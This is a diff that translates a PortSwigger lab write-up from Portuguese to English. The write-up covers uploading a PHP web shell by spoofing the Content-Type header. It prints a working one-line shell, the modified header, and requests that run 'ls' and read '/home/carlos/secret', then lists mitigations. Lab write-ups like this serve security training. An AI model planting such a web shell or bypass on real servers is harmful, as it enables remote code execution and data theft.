@@ -1,157 +1,160 @@
-# LAB:  Web shell upload via Content-Type restriction bypass
+> 🌐 **English** | [Português](LAB-02.pt-BR.md)
 
-**Módulo:** Server-side vulnerabilities //
-**Dificuldade:** Apprentice //
-**Categoria:** File upload vulnerabilities //
-**Status:** Resolvida
+# LAB: Web shell upload via Content-Type restriction bypass
 
-## Objetivo
+**Module:** Server-side vulnerabilities //
+**Difficulty:** Apprentice //
+**Category:** File upload vulnerabilities //
+**Status:** Solved //
 
-Este laboratório possui uma funcionalidade de upload de imagens que tenta impedir o envio de arquivos potencialmente perigosos. Entretanto, essa proteção depende exclusivamente do valor informado no cabeçalho **Content-Type**, controlado pelo próprio usuário.
+## Goal
 
-Para resolver o laboratório, era necessário realizar o upload de um web shell em PHP, contornar a validação do upload manipulando o cabeçalho da requisição e executar comandos no servidor para obter o conteúdo do arquivo `/home/carlos/secret`.
+This lab has an image upload feature that tries to prevent potentially dangerous files from being uploaded. However, this protection relies exclusively on the value of the **Content-Type** header, which is controlled by the user.
 
-Foi utilizada a conta fornecida pelo próprio exercício:
+To solve the lab, it was necessary to upload a PHP web shell, bypass the upload validation by tampering with the request header, and execute commands on the server to read the contents of `/home/carlos/secret`.
+
+The account provided by the exercise itself was used:
 
 ```
-Usuário: wiener
-Senha: peter
+Username: wiener
+Password: peter
 ```
 
-## Reconhecimento
+## Recon
 
-Inicialmente foi criado um arquivo chamado `shell.php` contendo um web shell simples em PHP:
+First, a file named `shell.php` was created, containing a simple PHP web shell:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-Ao tentar enviar esse arquivo normalmente através da funcionalidade de upload, a aplicação rejeitou o envio.
+When trying to upload this file normally through the upload feature, the application rejected it.
 
-Interceptando a requisição **POST** utilizando o Burp Suite, foi possível observar que o servidor utilizava o cabeçalho **Content-Type** para validar o tipo do arquivo enviado.
+Intercepting the **POST** request with Burp Suite, it was possible to observe that the server used the **Content-Type** header to validate the type of the uploaded file.
 
-Como esse cabeçalho é completamente controlado pelo cliente, surgiu a hipótese de que seria possível contornar essa validação alterando apenas seu valor, permitindo o envio de um arquivo PHP disfarçado como imagem.
+Since this header is completely controlled by the client, the hypothesis arose that it would be possible to bypass this validation by changing only its value, allowing a PHP file to be uploaded disguised as an image.
 
-Após o upload, o servidor armazenava o arquivo em um diretório acessível publicamente (`/files/avatars/`), permitindo sua execução diretamente pelo navegador.
+After the upload, the server stored the file in a publicly accessible directory (`/files/avatars/`), allowing it to be executed directly from the browser.
 
-## Abordagem
+## Approach
 
-- Criamos um arquivo chamado `shell.php` contendo um web shell básico em PHP.
-- Tentamos realizar o upload normalmente e a aplicação bloqueou o envio.
-- Interceptamos a requisição **POST** utilizando o Burp Suite.
-- Encaminhamos a requisição para o Repeater.
-- Identificamos que o arquivo estava sendo enviado com o cabeçalho:
+- Created a file named `shell.php` containing a basic PHP web shell.
+- Tried to upload it normally and the application blocked it.
+- Intercepted the **POST** request using Burp Suite.
+- Forwarded the request to Repeater.
+- Identified that the file was being sent with the header:
 
 ```http
 Content-Type: application/x-php
 ```
 
-- Alteramos esse cabeçalho para:
+- Changed this header to:
 
 ```http
 Content-Type: image/jpeg
 ```
 
-- Reenviamos a requisição.
-- O servidor aceitou o upload do arquivo PHP.
-- Em seguida, acessamos o arquivo enviado através da URL:
+- Resent the request.
+- The server accepted the upload of the PHP file.
+- Then accessed the uploaded file through the URL:
 
 ```
 /files/avatars/shell.php
 ```
 
-- Como o servidor interpretava arquivos PHP, o web shell foi executado.
-- Utilizamos o parâmetro `cmd` para executar comandos diretamente no sistema operacional.
-- Inicialmente executamos:
+- Since the server interpreted PHP files, the web shell was executed.
+- Used the `cmd` parameter to run commands directly on the operating system.
+- First ran:
 
 ```
 ?cmd=ls
 ```
 
-para confirmar que o web shell estava funcionando.
+to confirm the web shell was working.
 
-- Após confirmar a execução remota de comandos, executamos:
+- After confirming remote command execution, ran:
 
 ```
 ?cmd=cat+/home/carlos/secret
 ```
 
-- O servidor retornou o conteúdo do arquivo contendo o segredo do laboratório.
-- O segredo foi enviado utilizando o botão disponibilizado pela própria plataforma, concluindo o exercício.
+- The server returned the contents of the file containing the lab's secret.
+- The secret was submitted using the button provided by the platform itself, completing the exercise.
 
-## Payload / Técnica utilizada
+## Payload / Technique used
 
-### Web Shell enviado
+### Web shell uploaded
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-### Cabeçalho original
+### Original header
 
 ```http
 Content-Type: application/x-php
 ```
 
-### Cabeçalho modificado
+### Modified header
 
 ```http
 Content-Type: image/jpeg
 ```
 
-### Teste da execução remota
+### Remote execution test
 
 ```http
 GET /files/avatars/shell.php?cmd=ls HTTP/1.1
 ```
 
-### Extração da flag
+### Flag extraction
 
 ```http
 GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret HTTP/1.1
 ```
 
-## Evidência
+## Evidence
 
-![Evidência-01](imgs/Lab-02A.png)
+![Evidence-01](imgs/Lab-02A.png)
 
-![Evidência-02](imgs/Lab-02B.png)
+![Evidence-02](imgs/Lab-02B.png)
 
-## Resultado
+## Result
 
-A exploração confirmou que a validação do upload dependia exclusivamente do cabeçalho **Content-Type**, permitindo que um arquivo PHP fosse enviado ao servidor apenas alterando esse valor para um tipo permitido.
+The exploitation confirmed that the upload validation relied exclusively on the **Content-Type** header, allowing a PHP file to be uploaded to the server just by changing that value to an allowed type.
 
-Como o diretório de upload permitia a execução de scripts PHP, foi possível obter **Remote Code Execution (RCE)**, executar comandos arbitrários no sistema operacional e acessar o conteúdo do arquivo `/home/carlos/secret`, suficiente para concluir o laboratório.
+Since the upload directory allowed PHP scripts to run, it was possible to achieve **Remote Code Execution (RCE)**, run arbitrary commands on the operating system, and access the contents of `/home/carlos/secret`, enough to complete the lab.
 
-## Observações técnicas
+## Technical notes
 
-### Por que a falha ocorre?
+### Why does the flaw occur?
 
-Este laboratório apresenta duas falhas distintas que, quando combinadas, resultam em execução remota de código.
+This lab presents two distinct flaws that, when combined, result in remote code execution.
 
-#### 1. Validação insegura do Content-Type
+#### 1. Insecure Content-Type validation
 
-A aplicação verifica apenas o cabeçalho `Content-Type` enviado pelo cliente para decidir se um arquivo pode ou não ser enviado.
+The application only checks the client-supplied `Content-Type` header to decide whether a file can be uploaded.
 
-Como esse cabeçalho pode ser alterado livremente pelo usuário, um atacante consegue enviar um arquivo PHP informando falsamente que se trata de uma imagem (`image/jpeg`), contornando completamente a proteção implementada.
+Since this header can be freely modified by the user, an attacker can upload a PHP file while falsely claiming it is an image (`image/jpeg`), completely bypassing the implemented protection.
 
-#### 2. Execução de arquivos enviados
+#### 2. Execution of uploaded files
 
-Após o upload, o servidor armazena os arquivos em um diretório público onde scripts PHP são interpretados normalmente.
+After the upload, the server stores the files in a public directory where PHP scripts are interpreted normally.
 
-Isso permite que o arquivo enviado seja executado diretamente através de sua URL, transformando o upload em uma vulnerabilidade de **Remote Code Execution (RCE)**.
+This allows the uploaded file to be executed directly through its URL, turning the upload into a **Remote Code Execution (RCE)** vulnerability.
 
-### Como mitigar?
+### How to mitigate?
 
-- Nunca confiar no cabeçalho **Content-Type** enviado pelo cliente.
-- Validar a extensão do arquivo e seu conteúdo utilizando *magic bytes*.
-- Utilizar uma lista de permissões (*allowlist*) para tipos de arquivos aceitos.
-- Armazenar uploads fora da raiz pública da aplicação.
-- Configurar o servidor para impedir a execução de scripts em diretórios destinados a uploads.
-- Renomear os arquivos enviados utilizando nomes aleatórios.
-- Aplicar controles de autenticação e autorização para acesso aos arquivos enviados.
+- Never trust the client-supplied **Content-Type** header.
+- Validate the file extension and its content using *magic bytes*.
+- Use an allowlist for accepted file types.
+- Store uploads outside the application's public root.
+- Configure the server to prevent script execution in upload directories.
+- Rename uploaded files using random names.
+- Apply authentication and authorization controls for access to uploaded files.
 
-## Referências
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload) (link para o tópico, não para a lab específica com solução)
+## References
+
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload) (link to the topic, not to the specific lab solution)
 - OWASP Web Security Testing Guide - File Upload Testing
 - CWE-434 - Unrestricted Upload of File with Dangerous Type
